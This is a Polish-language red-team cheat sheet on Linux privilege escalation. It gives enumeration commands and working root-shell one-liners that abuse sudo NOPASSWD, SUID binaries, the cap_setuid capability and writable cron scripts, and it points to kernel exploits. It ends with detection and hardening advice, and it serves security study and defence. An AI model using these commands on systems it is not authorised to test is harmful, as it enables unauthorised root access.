---
title: "Linux Privilege Escalation"
category: "red-team"
tags: ["privesc", "linux", "post-exploitation"]
platform: "linux"
mitre: ["T1548", "T1068"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Linux Privilege Escalation

## TL;DR
Enumeruj → znajdź misconfig (sudo, SUID, cron, capabilities, kernel) → eskaluj. Zawsze zacznij od automatu, potem weryfikuj ręcznie.

## Enumeracja
```bash
# Automat
./linpeas.sh -a
# Ręcznie – szybkie zwycięstwa
id; sudo -l                         # co mogę uruchomić jako root
find / -perm -4000 -type f 2>/dev/null     # SUID
getcap -r / 2>/dev/null              # capabilities (cap_setuid=ep!)
cat /etc/crontab; ls -la /etc/cron.*  # cron jobs
uname -a                             # wersja kernela (exploity)
find / -writable -type d 2>/dev/null  # zapisywalne katalogi
```

## Wektory
```bash
# sudo bez hasła / NOPASSWD – sprawdź GTFOBins dla binarki
sudo -l
# przykład: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# SUID – GTFOBins
# np. SUID na /usr/bin/env:
/usr/bin/env /bin/sh -p

# Capabilities cap_setuid
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'

# Zapisywalny PATH + cron/root skrypt wywołujący binarkę względną
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /pisownia/skrypt

# Kernel exploit (ostatnia deska ratunku – ryzyko crash)
searchsploit linux kernel 5.x
```

## Wykrywanie (Blue Team)
- `sudo` na nietypowe binarki, tworzenie plików SUID (`chmod +s`).
- auditd: `execve` z `-p` flag, zmiany capabilities, modyfikacje cron.

## Mitygacja / Hardening
- Minimalizuj SUID (`find / -perm -4000`), usuń zbędne.
- `sudoers` bez wildcardów i shell-escape binarek; least privilege.
- Aktualny kernel, `noexec`/`nosuid` na `/tmp` i mountach danych.

## Źródła
- [GTFOBins](https://gtfobins.github.io/) · [linPEAS](https://github.com/peass-ng/PEASS-ng)
- Zobacz też: [suid-gtfobins.md](./suid-gtfobins.md)
